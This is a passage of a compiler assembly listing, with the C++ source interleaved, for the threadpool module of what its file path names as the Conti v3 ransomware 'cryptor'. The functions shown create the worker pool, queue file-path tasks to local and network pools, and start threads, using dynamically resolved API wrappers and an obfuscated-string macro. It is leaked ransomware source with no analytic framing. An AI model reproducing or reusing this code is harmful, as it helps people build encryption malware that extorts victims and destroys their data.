	00 00		 lea	 rax, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
  0004c	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 243  : 	}

  00050	eb 04		 jmp	 SHORT $LN5@IsActive
$LN4@IsActive:

; 244  : 	else {
; 245  : 		return FALSE;

  00052	33 c0		 xor	 eax, eax
  00054	eb 07		 jmp	 SHORT $LN1@IsActive
$LN5@IsActive:
$LN3@IsActive:

; 246  : 	}
; 247  : 
; 248  : 	return ThreadPoolInfo->IsActive;

  00056	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0005a	8b 40 10	 mov	 eax, DWORD PTR [rax+16]
$LN1@IsActive:

; 249  : }

  0005d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00064	5f		 pop	 rdi
  00065	5d		 pop	 rbp
  00066	c3		 ret	 0
?IsActive@threadpool@@YAHH@Z ENDP			; threadpool::IsActive
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?PutFinalTask@threadpool@@YAHH@Z
_TEXT	SEGMENT
ThreadPoolInfo$ = 8
Task$ = 40
$T1 = 264
tv74 = 280
ThreadPoolID$ = 320
?PutFinalTask@threadpool@@YAHH@Z PROC			; threadpool::PutFinalTask, COMDAT

; 207  : {

$LN13:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 208  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;

  0001e	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ThreadPoolInfo$[rbp], 0

; 209  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  00026	83 bd 40 01 00
	00 00		 cmp	 DWORD PTR ThreadPoolID$[rbp], 0
  0002d	75 0d		 jne	 SHORT $LN5@PutFinalTa

; 210  : 		ThreadPoolInfo = &g_LocalThreadPool;

  0002f	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  00036	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 211  : 	}

  0003a	eb 1d		 jmp	 SHORT $LN6@PutFinalTa
$LN5@PutFinalTa:

; 212  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  0003c	83 bd 40 01 00
	00 01		 cmp	 DWORD PTR ThreadPoolID$[rbp], 1
  00043	75 0d		 jne	 SHORT $LN7@PutFinalTa

; 213  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00045	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
  0004c	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 214  : 	}

  00050	eb 07		 jmp	 SHORT $LN8@PutFinalTa
$LN7@PutFinalTa:

; 215  : 	else {
; 216  : 		return FALSE;

  00052	33 c0		 xor	 eax, eax
  00054	e9 c2 00 00 00	 jmp	 $LN1@PutFinalTa
$LN8@PutFinalTa:
$LN6@PutFinalTa:

; 217  : 	}
; 218  : 
; 219  : 	PTASK_INFO Task = new TASK_INFO;

  00059	b9 38 00 00 00	 mov	 ecx, 56			; 00000038H
  0005e	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00063	48 89 85 08 01
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  0006a	48 83 bd 08 01
	00 00 00	 cmp	 QWORD PTR $T1[rbp], 0
  00072	74 15		 je	 SHORT $LN11@PutFinalTa
  00074	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR $T1[rbp]
  0007b	e8 00 00 00 00	 call	 ??0task_info_@@QEAA@XZ
  00080	48 89 85 18 01
	00 00		 mov	 QWORD PTR tv74[rbp], rax
  00087	eb 0b		 jmp	 SHORT $LN12@PutFinalTa
$LN11@PutFinalTa:
  00089	48 c7 85 18 01
	00 00 00 00 00
	00		 mov	 QWORD PTR tv74[rbp], 0
$LN12@PutFinalTa:
  00094	48 8b 85 18 01
	00 00		 mov	 rax, QWORD PTR tv74[rbp]
  0009b	48 89 45 28	 mov	 QWORD PTR Task$[rbp], rax

; 220  : 	if (!Task) {

  0009f	48 83 7d 28 00	 cmp	 QWORD PTR Task$[rbp], 0
  000a4	75 04		 jne	 SHORT $LN9@PutFinalTa

; 221  : 
; 222  : 		//logs::Write(OBFW(L"Can't add file %s to file list."), Filename.c_str());
; 223  : 		return FALSE;

  000a6	33 c0		 xor	 eax, eax
  000a8	eb 71		 jmp	 SHORT $LN1@PutFinalTa
$LN9@PutFinalTa:

; 224  : 
; 225  : 	}
; 226  : 
; 227  : 	Task->Stop = TRUE;

  000aa	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  000ae	c7 40 20 01 00
	00 00		 mov	 DWORD PTR [rax+32], 1

; 228  : 	pEnterCriticalSection(&ThreadPoolInfo->CriticalSection);

  000b5	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  000b9	48 83 c0 18	 add	 rax, 24
  000bd	48 8b c8	 mov	 rcx, rax
  000c0	e8 00 00 00 00	 call	 ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection
$LN4@PutFinalTa:

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  000c5	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  000c9	48 c7 40 28 00
	00 00 00	 mov	 QWORD PTR [rax+40], 0
  000d1	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  000d5	48 8b 4d 08	 mov	 rcx, QWORD PTR ThreadPoolInfo$[rbp]
  000d9	48 8b 49 48	 mov	 rcx, QWORD PTR [rcx+72]
  000dd	48 89 48 30	 mov	 QWORD PTR [rax+48], rcx
  000e1	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  000e5	48 8b 40 48	 mov	 rax, QWORD PTR [rax+72]
  000e9	48 8b 4d 28	 mov	 rcx, QWORD PTR Task$[rbp]
  000ed	48 89 08	 mov	 QWORD PTR [rax], rcx
  000f0	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  000f4	48 83 c0 28	 add	 rax, 40			; 00000028H
  000f8	48 8b 4d 08	 mov	 rcx, QWORD PTR ThreadPoolInfo$[rbp]
  000fc	48 89 41 48	 mov	 QWORD PTR [rcx+72], rax
  00100	33 c0		 xor	 eax, eax
  00102	85 c0		 test	 eax, eax
  00104	75 bf		 jne	 SHORT $LN4@PutFinalTa

; 230  : 	pLeaveCriticalSection(&ThreadPoolInfo->CriticalSection);

  00106	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0010a	48 83 c0 18	 add	 rax, 24
  0010e	48 8b c8	 mov	 rcx, rax
  00111	e8 00 00 00 00	 call	 ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection

; 231  : 	return TRUE;

  00116	b8 01 00 00 00	 mov	 eax, 1
$LN1@PutFinalTa:

; 232  : }

  0011b	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  00122	5f		 pop	 rdi
  00123	5d		 pop	 rbp
  00124	c3		 ret	 0
?PutFinalTask@threadpool@@YAHH@Z ENDP			; threadpool::PutFinalTask
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
_TEXT	SEGMENT
ThreadPoolInfo$ = 8
Task$ = 40
$T1 = 260
$T2 = 296
$T3 = 324
$T4 = 356
tv75 = 376
ThreadPoolID$ = 416
Path$ = 424
?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z PROC ; threadpool::PutTask, COMDAT

; 174  : {

$LN13:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec a8 01
	00 00		 sub	 rsp, 424		; 000001a8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 175  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;

  00023	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ThreadPoolInfo$[rbp], 0

; 176  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  0002b	83 bd a0 01 00
	00 00		 cmp	 DWORD PTR ThreadPoolID$[rbp], 0
  00032	75 0d		 jne	 SHORT $LN5@PutTask

; 177  : 		ThreadPoolInfo = &g_LocalThreadPool;

  00034	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  0003b	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 178  : 	}

  0003f	eb 37		 jmp	 SHORT $LN6@PutTask
$LN5@PutTask:

; 179  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  00041	83 bd a0 01 00
	00 01		 cmp	 DWORD PTR ThreadPoolID$[rbp], 1
  00048	75 0d		 jne	 SHORT $LN7@PutTask

; 180  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  0004a	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
  00051	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 181  : 	}

  00055	eb 21		 jmp	 SHORT $LN6@PutTask
$LN7@PutTask:

; 182  : 	else {
; 183  : 		return FALSE;

  00057	c7 85 04 01 00
	00 00 00 00 00	 mov	 DWORD PTR $T1[rbp], 0
  00061	48 8b 8d a8 01
	00 00		 mov	 rcx, QWORD PTR Path$[rbp]
  00068	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0006d	8b 85 04 01 00
	00		 mov	 eax, DWORD PTR $T1[rbp]
  00073	e9 09 01 00 00	 jmp	 $LN1@PutTask
$LN6@PutTask:

; 184  : 	}
; 185  : 
; 186  : 	PTASK_INFO Task = new TASK_INFO;

  00078	b9 38 00 00 00	 mov	 ecx, 56			; 00000038H
  0007d	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00082	48 89 85 28 01
	00 00		 mov	 QWORD PTR $T2[rbp], rax
  00089	48 83 bd 28 01
	00 00 00	 cmp	 QWORD PTR $T2[rbp], 0
  00091	74 15		 je	 SHORT $LN11@PutTask
  00093	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR $T2[rbp]
  0009a	e8 00 00 00 00	 call	 ??0task_info_@@QEAA@XZ
  0009f	48 89 85 78 01
	00 00		 mov	 QWORD PTR tv75[rbp], rax
  000a6	eb 0b		 jmp	 SHORT $LN12@PutTask
$LN11@PutTask:
  000a8	48 c7 85 78 01
	00 00 00 00 00
	00		 mov	 QWORD PTR tv75[rbp], 0
$LN12@PutTask:
  000b3	48 8b 85 78 01
	00 00		 mov	 rax, QWORD PTR tv75[rbp]
  000ba	48 89 45 28	 mov	 QWORD PTR Task$[rbp], rax

; 187  : 	if (!Task) {

  000be	48 83 7d 28 00	 cmp	 QWORD PTR Task$[rbp], 0
  000c3	75 21		 jne	 SHORT $LN9@PutTask

; 188  : 
; 189  : 		//logs::Write(OBFW(L"Can't add file %s to file list."), Filename.c_str());
; 190  : 		return FALSE;

  000c5	c7 85 44 01 00
	00 00 00 00 00	 mov	 DWORD PTR $T3[rbp], 0
  000cf	48 8b 8d a8 01
	00 00		 mov	 rcx, QWORD PTR Path$[rbp]
  000d6	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000db	8b 85 44 01 00
	00		 mov	 eax, DWORD PTR $T3[rbp]
  000e1	e9 9b 00 00 00	 jmp	 $LN1@PutTask
$LN9@PutTask:

; 191  : 
; 192  : 	}
; 193  : 
; 194  : 	Task->Path = Path;

  000e6	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  000ea	48 8b 95 a8 01
	00 00		 mov	 rdx, QWORD PTR Path$[rbp]
  000f1	48 8b c8	 mov	 rcx, rax
  000f4	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=

; 195  : 	Task->Stop = FALSE;

  000f9	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  000fd	c7 40 20 00 00
	00 00		 mov	 DWORD PTR [rax+32], 0

; 196  : 
; 197  : 	pEnterCriticalSection(&ThreadPoolInfo->CriticalSection);

  00104	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00108	48 83 c0 18	 add	 rax, 24
  0010c	48 8b c8	 mov	 rcx, rax
  0010f	e8 00 00 00 00	 call	 ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection
$LN4@PutTask:

; 198  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  00114	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  00118	48 c7 40 28 00
	00 00 00	 mov	 QWORD PTR [rax+40], 0
  00120	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  00124	48 8b 4d 08	 mov	 rcx, QWORD PTR ThreadPoolInfo$[rbp]
  00128	48 8b 49 48	 mov	 rcx, QWORD PTR [rcx+72]
  0012c	48 89 48 30	 mov	 QWORD PTR [rax+48], rcx
  00130	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00134	48 8b 40 48	 mov	 rax, QWORD PTR [rax+72]
  00138	48 8b 4d 28	 mov	 rcx, QWORD PTR Task$[rbp]
  0013c	48 89 08	 mov	 QWORD PTR [rax], rcx
  0013f	48 8b 45 28	 mov	 rax, QWORD PTR Task$[rbp]
  00143	48 83 c0 28	 add	 rax, 40			; 00000028H
  00147	48 8b 4d 08	 mov	 rcx, QWORD PTR ThreadPoolInfo$[rbp]
  0014b	48 89 41 48	 mov	 QWORD PTR [rcx+72], rax
  0014f	33 c0		 xor	 eax, eax
  00151	85 c0		 test	 eax, eax
  00153	75 bf		 jne	 SHORT $LN4@PutTask

; 199  : 	pLeaveCriticalSection(&ThreadPoolInfo->CriticalSection);

  00155	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00159	48 83 c0 18	 add	 rax, 24
  0015d	48 8b c8	 mov	 rcx, rax
  00160	e8 00 00 00 00	 call	 ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection

; 200  : 	return TRUE;

  00165	c7 85 64 01 00
	00 01 00 00 00	 mov	 DWORD PTR $T4[rbp], 1
  0016f	48 8b 8d a8 01
	00 00		 mov	 rcx, QWORD PTR Path$[rbp]
  00176	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0017b	8b 85 64 01 00
	00		 mov	 eax, DWORD PTR $T4[rbp]
$LN1@PutTask:

; 201  : }

  00181	48 8d a5 88 01
	00 00		 lea	 rsp, QWORD PTR [rbp+392]
  00188	5f		 pop	 rdi
  00189	5d		 pop	 rbp
  0018a	c3		 ret	 0
?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ENDP ; threadpool::PutTask
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?Start@threadpool@@YAHH@Z
_TEXT	SEGMENT
ThreadPoolInfo$ = 8
i$1 = 40
ThreadPoolID$ = 288
?Start@threadpool@@YAHH@Z PROC				; threadpool::Start, COMDAT

; 148  : {

$LN10:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 38 01
	00 00		 sub	 rsp, 312		; 00000138H
  0000d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 149  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;

  0001e	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ThreadPoolInfo$[rbp], 0

; 150  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  00026	83 bd 20 01 00
	00 00		 cmp	 DWORD PTR ThreadPoolID$[rbp], 0
  0002d	75 0d		 jne	 SHORT $LN5@Start

; 151  : 		ThreadPoolInfo = &g_LocalThreadPool;

  0002f	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  00036	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 152  : 	}

  0003a	eb 1a		 jmp	 SHORT $LN6@Start
$LN5@Start:

; 153  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  0003c	83 bd 20 01 00
	00 01		 cmp	 DWORD PTR ThreadPoolID$[rbp], 1
  00043	75 0d		 jne	 SHORT $LN7@Start

; 154  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00045	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
  0004c	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 155  : 	}

  00050	eb 04		 jmp	 SHORT $LN8@Start
$LN7@Start:

; 156  : 	else {
; 157  : 		return FALSE;

  00052	33 c0		 xor	 eax, eax
  00054	eb 69		 jmp	 SHORT $LN1@Start
$LN8@Start:
$LN6@Start:

; 158  : 	}
; 159  : 
; 160  : 	ThreadPoolInfo->IsActive = TRUE;

  00056	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0005a	c7 40 10 01 00
	00 00		 mov	 DWORD PTR [rax+16], 1

; 161  : 
; 162  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  00061	48 c7 45 28 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  00069	eb 0b		 jmp	 SHORT $LN4@Start
$LN2@Start:
  0006b	48 8b 45 28	 mov	 rax, QWORD PTR i$1[rbp]
  0006f	48 ff c0	 inc	 rax
  00072	48 89 45 28	 mov	 QWORD PTR i$1[rbp], rax
$LN4@Start:
  00076	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0007a	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  0007e	48 39 45 28	 cmp	 QWORD PTR i$1[rbp], rax
  00082	73 36		 jae	 SHORT $LN3@Start

; 163  : 		ThreadPoolInfo->hThreads[i] = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadpoolHandler, ThreadPoolInfo, 0, NULL);

  00084	48 c7 44 24 28
	00 00 00 00	 mov	 QWORD PTR [rsp+40], 0
  0008d	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  00095	4c 8b 4d 08	 mov	 r9, QWORD PTR ThreadPoolInfo$[rbp]
  00099	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z ; ThreadpoolHandler
  000a0	33 d2		 xor	 edx, edx
  000a2	33 c9		 xor	 ecx, ecx
  000a4	e8 00 00 00 00	 call	 ?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ; pCreateThread
  000a9	48 8b 4d 08	 mov	 rcx, QWORD PTR ThreadPoolInfo$[rbp]
  000ad	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  000b0	48 8b 55 28	 mov	 rdx, QWORD PTR i$1[rbp]
  000b4	48 89 04 d1	 mov	 QWORD PTR [rcx+rdx*8], rax

; 164  : 	}

  000b8	eb b1		 jmp	 SHORT $LN2@Start
$LN3@Start:

; 165  : 
; 166  : 	return TRUE;

  000ba	b8 01 00 00 00	 mov	 eax, 1
$LN1@Start:

; 167  : }

  000bf	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  000c6	5f		 pop	 rdi
  000c7	5d		 pop	 rbp
  000c8	c3		 ret	 0
?Start@threadpool@@YAHH@Z ENDP				; threadpool::Start
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?Create@threadpool@@YAHH_K@Z
_TEXT	SEGMENT
ThreadPoolInfo$ = 8
ThreadPoolID$ = 256
ThreadsCount$ = 264
?Create@threadpool@@YAHH_K@Z PROC			; threadpool::Create, COMDAT

; 122  : {

$LN11:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 123  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;

  00023	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ThreadPoolInfo$[rbp], 0

; 124  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  0002b	83 bd 00 01 00
	00 00		 cmp	 DWORD PTR ThreadPoolID$[rbp], 0
  00032	75 0d		 jne	 SHORT $LN5@Create

; 125  : 		ThreadPoolInfo = &g_LocalThreadPool;

  00034	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  0003b	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 126  : 	} 

  0003f	eb 1a		 jmp	 SHORT $LN6@Create
$LN5@Create:

; 127  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  00041	83 bd 00 01 00
	00 01		 cmp	 DWORD PTR ThreadPoolID$[rbp], 1
  00048	75 0d		 jne	 SHORT $LN7@Create

; 128  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  0004a	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
  00051	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 129  : 	}

  00055	eb 04		 jmp	 SHORT $LN8@Create
$LN7@Create:

; 130  : 	else {
; 131  : 		return FALSE;

  00057	33 c0		 xor	 eax, eax
  00059	eb 79		 jmp	 SHORT $LN1@Create
$LN8@Create:
$LN6@Create:
$LN4@Create:

; 132  : 	}
; 133  : 
; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  0005b	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0005f	48 c7 40 40 00
	00 00 00	 mov	 QWORD PTR [rax+64], 0
  00067	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0006b	48 83 c0 40	 add	 rax, 64			; 00000040H
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR ThreadPoolInfo$[rbp]
  00073	48 89 41 48	 mov	 QWORD PTR [rcx+72], rax
  00077	33 c0		 xor	 eax, eax
  00079	85 c0		 test	 eax, eax
  0007b	75 de		 jne	 SHORT $LN4@Create

; 135  : 	ThreadPoolInfo->ThreadsCount = ThreadsCount;

  0007d	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00081	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR ThreadsCount$[rbp]
  00088	48 89 48 08	 mov	 QWORD PTR [rax+8], rcx

; 136  : 	ThreadPoolInfo->IsActive = FALSE;

  0008c	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00090	c7 40 10 00 00
	00 00		 mov	 DWORD PTR [rax+16], 0

; 137  : 	pInitializeCriticalSection(&ThreadPoolInfo->CriticalSection);

  00097	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0009b	48 83 c0 18	 add	 rax, 24
  0009f	48 8b c8	 mov	 rcx, rax
  000a2	e8 00 00 00 00	 call	 ?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pInitializeCriticalSection

; 138  : 	ThreadPoolInfo->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);

  000a7	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR ThreadsCount$[rbp]
  000ae	48 c1 e0 03	 shl	 rax, 3
  000b2	48 8b c8	 mov	 rcx, rax
  000b5	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  000ba	48 8b 4d 08	 mov	 rcx, QWORD PTR ThreadPoolInfo$[rbp]
  000be	48 89 01	 mov	 QWORD PTR [rcx], rax

; 139  : 	if (!ThreadPoolInfo->hThreads) {

  000c1	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  000c5	48 83 38 00	 cmp	 QWORD PTR [rax], 0
  000c9	75 04		 jne	 SHORT $LN9@Create

; 140  : 		return FALSE;

  000cb	33 c0		 xor	 eax, eax
  000cd	eb 05		 jmp	 SHORT $LN1@Create
$LN9@Create:

; 141  : 	}
; 142  : 
; 143  : 	return TRUE;

  000cf	b8 01 00 00 00	 mov	 eax, 1
$LN1@Create:

; 144  : }

  000d4	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  000db	5f		 pop	 rdi
  000dc	5d		 pop	 rbp
  000dd	c3		 ret	 0
?Create@threadpool@@YAHH_K@Z ENDP			; threadpool::Create
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?Initialize@threadpool@@YAXXZ
_TEXT	SEGMENT
?Initialize@threadpool@@YAXXZ PROC			; threadpool::Initialize, COMDAT

; 110  : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 111  : 	RtlSecureZeroMemory(&g_LocalThreadPool, sizeof(g_LocalThreadPool));

  0001b	ba 50 00 00 00	 mov	 edx, 80			; 00000050H
  00020	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  00027	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 112  : 	RtlSecureZeroMemory(&g_LocalThreadPool, sizeof(g_LocalThreadPool));

  0002c	ba 50 00 00 00	 mov	 edx, 80			; 00000050H
  00031	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  00038	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 113  : 	g_LocalThreadPool.IsActive = FALSE;

  0003d	c7 05 10 00 00
